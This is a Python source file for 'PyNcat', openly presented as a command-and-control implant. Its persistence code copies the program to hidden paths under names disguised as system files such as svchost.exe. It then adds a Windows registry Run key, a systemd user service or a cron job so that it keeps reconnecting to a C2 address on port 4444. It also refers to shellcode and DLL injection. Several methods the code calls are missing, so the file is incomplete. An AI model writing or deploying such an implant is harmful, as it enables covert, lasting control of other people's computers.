#!/usr/bin/env python3
"""
PyNcat - Professional C2 with SSL, Persistence & Process Injection
"""

import argparse
import socket
import subprocess
import sys
import threading
import logging
from pathlib import Path
import time
import random
import ssl
import os
import platform
from typing import Optional, Tuple

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] [%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)


class PyNcat:
    def __init__(self):
        self.args = self.parse_args()
        self.ssl_context: Optional[ssl.SSLContext] = None
        if self.args.ssl:
            self.setup_ssl()

    def parse_args(self):
        parser = argparse.ArgumentParser(description="PyNcat - Professional C2", formatter_class=argparse.ArgumentDefaultsHelpFormatter)

        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-l', '--listen', action='store_true', help='Listen mode')
        group.add_argument('-c', '--connect', type=str, help='Target IP')

        parser.add_argument('-p', '--port', type=int, required=True, help='Port number')
        parser.add_argument('--ssl', action='store_true', help='Enable SSL')
        parser.add_argument('--persistent', action='store_true', help='Enable persistence')
        parser.add_argument('--persist-method', choices=['auto', 'registry', 'cron', 'systemd'], default='auto',
                            help='Persistence method')
        
        # ... (keep your existing arguments: --inject-pid, --file, etc.)

        parser.add_argument('-v', '--verbose', action='store_true')
        return parser.parse_args()

             # ====================== PERSISTENCE ======================
    def self_copy_to_hidden(self) -> Optional[str]:
        """Copy itself to a hidden location and return new path"""
        try:
            original_path = os.path.abspath(sys.argv[0])
            system = platform.system().lower()

            if system == "windows":
                # Hidden location: %APPDATA%\Microsoft\Windows\Themes\
                base_dir = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Themes")
                os.makedirs(base_dir, exist_ok=True)
                new_name = "SystemUpdate.exe" if original_path.endswith('.py') else "svchost.exe"
                new_path = os.path.join(base_dir, new_name)

            elif system == "linux":
                # Hidden location: ~/.config/.system/
                base_dir = os.path.expanduser("~/.config/.system")
                os.makedirs(base_dir, exist_ok=True)
                new_name = ".dbus-update" if original_path.endswith('.py') else ".systemd"
                new_path = os.path.join(base_dir, new_name)
            else:
                logger.warning("[!] Self-copy not supported on this OS")
                return original_path

            # Copy file
            import shutil
            if os.path.exists(new_path):
                os.remove(new_path)
            shutil.copy2(original_path, new_path)

            # Make executable on Linux
            if system == "linux":
                os.chmod(new_path, 0o755)

            logger.info(f"[+] Self copied to hidden location: {new_path}")
            return new_path

        except Exception as e:
            logger.error(f"Self-copy failed: {e}")
            return os.path.abspath(sys.argv[0])

    def install_persistence(self):
        """Install persistence with self-copy first"""
        if not self.args.persistent:
            return

        # Step 1: Self-copy to hidden location
        hidden_path = self.self_copy_to_hidden()
        
        # Step 2: Get C2 IP
        c2_ip = self.args.connect or self._get_public_ip() or "YOUR_C2_IP_HERE"

        logger.info(f"[*] Installing persistence using hidden binary: {hidden_path}")
        logger.info(f"[*] C2 Target: {c2_ip}")

        system = platform.system().lower()
        
        if system == "windows":
            self._windows_persistence(hidden_path, c2_ip)
        elif system == "linux":
            self._linux_persistence(hidden_path, c2_ip)
        else:
            logger.warning(f"[!] Persistence not fully supported on {system}")

    def _windows_persistence(self, binary_path: str, c2_ip: str):
        """Windows persistence using hidden binary"""
        cmd = f'"{binary_path}" -c {c2_ip} -p 4444 --ssl --persistent'

        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               r"Software\Microsoft\Windows\CurrentVersion\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, cmd)
            winreg.CloseKey(key)
            logger.info("[+] Windows Registry persistence installed (hidden location)")
        except Exception as e:
            logger.error(f"Registry persistence failed: {e}")

    def _linux_persistence(self, binary_path: str, c2_ip: str):
        """Linux persistence"""
        cmd = f"{binary_path} -c {c2_ip} -p 4444 --ssl --persistent"
        
        try:
            service_path = f"{os.path.expanduser('~')}/.config/systemd/user/pyncat.service"
            os.makedirs(os.path.dirname(service_path), exist_ok=True)
            
            service = f"""[Unit]
Description=System Maintenance

[Service]
ExecStart={cmd}
Restart=always
RestartSec=8

[Install]
WantedBy=default.target
"""
            with open(service_path, "w") as f:
                f.write(service)

            subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
            subprocess.run(["systemctl", "--user", "enable", "--now", "pyncat.service"], capture_output=True)
            logger.info("[+] Linux systemd persistence installed")
        except:
            # Fallback cron
            try:
                cron_cmd = f"*/3 * * * * {cmd} >/dev/null 2>&1"
                subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True)
                logger.info("[+] Linux cron persistence installed")
            except Exception as e:
                logger.error(f"Cron failed: {e}")

    def _get_public_ip(self) -> Optional[str]:
        try:
            import urllib.request
            with urllib.request.urlopen('https://api.ipify.org', timeout=4) as r:
                return r.read().decode().strip()
        except:
            return None
    # ====================== RUN ======================
    def run(self):
        # Process Injection (highest priority)
        if self.args.inject_pid:
            if self.args.inject_shellcode:
                self.inject_shellcode(self.args.inject_pid, self.args.inject_shellcode)
            elif self.args.inject_dll:
                self.inject_dll(self.args.inject_pid, self.args.inject_dll)
            return

        # Install persistence BEFORE connecting
        if self.args.persistent:
            self.install_persistence()

        # Normal C2 Operation
        if self.args.listen:
            self.listen()
        else:
            if self.args.persistent:
                self.connect_persistent()
            else:
                self.connect_once()

if __name__ == "__main__":
    try:
        pyncat = PyNcat()
        pyncat.run()
    except KeyboardInterrupt:
        print("\n[!] PyNcat terminated.")
    except Exception as e:
        logger.error(f"Critical error: {e}")
